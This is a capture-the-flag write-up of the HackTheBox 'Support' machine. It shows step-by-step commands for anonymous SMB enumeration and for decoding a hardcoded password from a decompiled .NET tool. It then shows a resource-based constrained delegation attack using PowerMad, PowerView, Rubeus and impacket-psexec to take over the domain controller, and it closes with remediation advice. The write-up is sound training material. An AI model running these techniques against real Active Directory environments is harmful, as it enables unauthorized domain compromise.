
# SUPPORT

![Support Info Card](Support_info-card.png)

This write-up details the attack path taken against the Support box on HackTheBox, outlining the techniques and vulnerabilities exploited to achieve remote code execution on the domain controller.

## Reconnaissance and Enumeration

The initial phase began with an **nmap** scan that revealed multiple open ports associated with Active Directory services.

```sh
❯ sudo nmap -sC -sV -T4 -vv -oA nmapScans/support 10.129.243.69
Command executed at: 2025-03-04 16:17:59
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-04 16:17 PST
<SNIP>
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus 
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-05 00:18:11Z)
...
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
Nmap done: 1 IP address (1 host up) scanned in 60.19 seconds
```

Next, SMB enumeration showed that anonymous access was enabled. While listing available shares, the `support-tools` share was discovered. This share contained various helpdesk installers and a notable file: `UserInfo.exe.zip`.

```sh
❯ smbclient -N -L //10.129.243.69
Command executed at: 2025-03-04 16:25:36

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
```

```sh
❯ smbclient -N //10.129.243.69/support-tools/
Command executed at: 2025-03-04 17:00:29
smb: \> dir
  .                                   D        0  Wed Jul 20 10:01:06 2022
  ..                                  D        0  Sat May 28 04:18:25 2022
  ...
  UserInfo.exe.zip                    A   277499  Wed Jul 20 10:01:07 2022
```

The file was then downloaded for further analysis.

## Analysis and Exploitation

Research revealed that `UserInfo.exe` is a tool designed to display Active Directory user information. Upon decompiling the executable using dnSpy, a set of hardcoded credentials was discovered.
![Encoded Password - dnSpy](EncodedPassword_dnSpy.png)

The `LdapQuery()` method queries `support.htb` with username `support` and a password obtained from the `getPassword()` method.
The code snippet below from the `getPassword()` method shows how an encrypted password is decrypted using a static key:

```csharp
public static string getPassword()
{
    byte[] array = Convert.FromBase64String(Protected.enc_password);
    for (int i = 0; i < array.Length; i++)
    {
        array[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
    }
    return Encoding.Default.GetString(array);
}

private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");
```

A simple Python script was then used to reverse the encoding, resulting in the decrypted password:

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = "armando".encode('ascii')

decoded_bytes = base64.b64decode(enc_password)
decrypted_bytes = bytearray(decoded_bytes)
for i in range(len(decoded_bytes)):
    decrypted_bytes[i] = decoded_bytes[i] ^ key[i % len(key)] ^ 223

decrypted_password = decrypted_bytes.decode('utf-8', errors='ignore')
print("Decrypted Password:", decrypted_password)
```

This script outputs:

```txt
Decrypted Password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

With these credentials, an LDAP query was performed to retrieve additional account details for the `support` user.

```sh
❯ ldapsearch -x -H ldap://support.htb -D "support\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" > ldapsearch_basic.output
```

The LDAP output revealed the `support` user’s membership in the Shared Support Accounts group and provided the password:  
`support:Ironside47pleasure40Watchful`.

This password was then used to establish a WinRM session on port 5985:

```sh
❯ evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

A quick check on the desktop confirmed the user flag:

```powershell
*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
38a856xxxxxxxxxxxxxx898dc8
```

### Escalation via GenericAll Privileges and RBCD

Further network enumeration with SharpHound, followed by analysis in BloodHound, confirmed that the `support` user was in the Shared Support Accounts group. This group had been granted GenericAll privileges over the domain controller (`DC.SUPPORT.HTB`), enabling the creation of a rogue machine to facilitate a Resource-Based Constrained Delegation (RBCD) attack.

![BloodHound Data](Bloodhound_GenericAll.png)

A rogue computer account, `FAKE01`, was added to the domain using PowerMad:

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> import-module .\Powermad.ps1
*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force) -Verbose
```

Verification of the new account was performed using PowerView:

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer FAKE01
```

Next, a security descriptor was crafted for FAKE01 to allow it to impersonate users on the domain controller:

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-6101)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

This descriptor was then applied to `DC.SUPPORT.HTB`:

```powershell
Get-DomainComputer "DC.SUPPORT.HTB" | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

With GenericAll privileges and RBCD in place, FAKE01 was used to impersonate the Administrator. An RC4 hash for FAKE01 was generated with Rubeus:

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> ./Rubeus.exe hash /password:'P@ssw0rd123!' /user:fake01 /domain:SUPPORT.HTB
```

Then, a Kerberos ticket was requested for the Administrator account:

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> ./Rubeus.exe s4u /user:fake01 /rc4:7DFA0531D73101CA080C7379A9BFF1C7 /impersonateuser:Administrator /msdsspn:cifs/DC.SUPPORT.HTB /ptt /nowrap
```

After confirming the ticket was cached using `klist`, the base64 kirbi ticket was converted to a ccache file:

```sh
❯ base64 -d administrator.ticket.kirbi.b64 > administrator.ticket.kirbi
❯ sudo impacket-ticketConverter administrator.ticket.kirbi administrator.ccache
```

Finally, remote code execution was achieved using impacket-PsExec:

```sh
❯ KRB5CCNAME=administrator.ccache sudo impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
```

Once inside, navigating to the Administrator desktop revealed the root flag:

```cmd
C:\Users\Administrator\Desktop> type root.txt
b34047xxxxxxxxxxxxx73db50
```

![Completion](completion.png)

## Findings and Remediation

### Findings

- **Anonymous SMB Access:** The configuration allowed anonymous listings, exposing sensitive shares.
- **Insecure File Sharing:** The `support-tools` share contained exploitable files, such as `UserInfo.exe.zip`.
- **Hardcoded Credentials:** The decompiled `UserInfo.exe` revealed hardcoded credentials that facilitated further exploitation.
- **Excessive AD Privileges:** The `support` user’s membership in a group with GenericAll rights enabled domain controller compromise via RBCD.

### Remediation

- **SMB Hardening:** Disable anonymous access and enforce strict authentication protocols.
- **Secure File Shares:** Limit access to sensitive shares to authorized users only.
- **Code Security:** Avoid embedding hardcoded credentials; instead, implement secure credential management and conduct regular code audits.
- **Active Directory Audits:** Regularly review and restrict group memberships and privileges, ensuring adherence to the principle of least privilege.

## Lessons Learned

This engagement highlights the risks inherent in misconfigured services and insecure coding practices. Decompiling .NET applications can easily expose sensitive data that developers may assume is hidden. Moreover, default domain settings—such as allowing the creation of multiple computer accounts and overly permissive rights—can be exploited to escalate privileges. With GenericAll access over critical systems, attackers can leverage RBCD to impersonate high-privilege accounts, leading to full network compromise.
